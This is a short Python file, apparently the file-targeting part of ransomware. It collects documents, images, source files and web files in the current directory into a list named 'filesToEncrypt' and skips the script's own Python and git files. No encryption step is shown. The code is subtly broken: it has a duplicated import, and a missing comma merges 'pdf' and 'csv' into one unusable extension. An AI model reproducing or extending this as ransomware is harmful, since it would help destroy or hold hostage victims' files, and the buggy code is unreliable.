import os

import os


def getFiles():
    supportedExtensions = ("txt", "java", "c", "png", "pdf"
                           "csv", "cgi", "pl", "html", "js", "php")
    directoryFiles = os.listdir()
    exceptions = ["py", "gitignore", "git", "md"]
    filesToEncrypt = []
    for file in directoryFiles:
        try:
            if str(file).count(".") > 0:
                fileExtension = (str(file.rsplit(".")[1]))
        except:
            fileExtension = ""
        if fileExtension != "":
            if (supportedExtensions.count(fileExtension) > 0) & (exceptions.count(fileExtension) < 1):
                filesToEncrypt.append(file)

    return filesToEncrypt
